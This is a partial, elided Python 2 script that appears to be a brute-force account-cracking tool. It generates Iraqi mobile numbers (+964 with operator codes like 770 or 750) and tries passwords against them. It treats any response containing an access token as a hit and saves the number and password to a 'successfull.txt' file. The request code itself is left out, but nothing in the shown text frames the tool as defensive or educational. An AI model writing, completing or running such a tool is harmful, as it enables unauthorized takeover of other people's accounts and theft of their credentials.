...
def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91mHalbzhera \x1b[1;92m>>>\x1b[1;92m ')
    if bch == '':
        ...
        os.system('clear')
        print logo
        print '\x1b[1;90m770 - 771 - 772 - 773 - 750 - 751 - 752 - 780 - 781 - 782'
        try:
            c = raw_input('\x1b[1;96mChoose Code : ')
            k = '+964'
            idlist = '.txt'
    ...
    time.sleep(0.1)
    psb('\x1b[1;92m[\xe2\x9c\x93]\x1b[1;92m Please wait, process is running ...')
    time.sleep(0.1)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[ OK ]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('save/successfull.txt', 'a')
